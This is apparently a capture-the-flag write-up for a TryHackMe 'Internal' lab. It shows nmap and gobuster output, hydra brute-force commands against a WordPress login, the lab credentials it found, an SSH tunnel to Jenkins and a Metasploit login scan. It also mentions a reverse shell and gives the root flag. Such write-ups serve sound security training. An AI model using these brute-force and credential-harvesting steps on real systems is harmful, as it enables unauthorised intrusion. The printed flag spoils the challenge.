# Internal
#### Silvestre GarcÃ­a
---

## nmap
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:E7:25:FB:D9:A1 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## gobuster
```bash
===============================================================
[+] Url:                     http://10.10.213.171
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/07/21 22:35:29 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/blog                 (Status: 301) [Size: 313] [--> http://10.10.213.171/blog/]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.213.171/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.213.171/phpmyadmin/]
/server-status        (Status: 403) [Size: 278]
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.213.171/wordpress/]
```

## Getting credentials for CMS
username
```bash
hydra -L /usr/share/wordlists/rockyou.txt -p asd 10.10.213.171 http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^:Unknown username." -v
```

password
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.213.171 http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -v 
```

username: admin
password: my2boys

## Privilege escalation
**Found on /opt/wp-save.txt
```
Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

### Jenkins
SSH tunnel
```
ssh -L 9000:localhost:8080 aubreanna@10.10.244.117
```

using metasploit auxiliary/scanner/http/jenkins_login found credentials
```
[+] 127.0.0.1:9000 - Login Successful: admin:spongebob
```

**Got reverse shell using groove**

**Found root password on /opt of jenkins docker.**


note.txt
```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

root flag: THM{d0ck3r_d3str0y3r}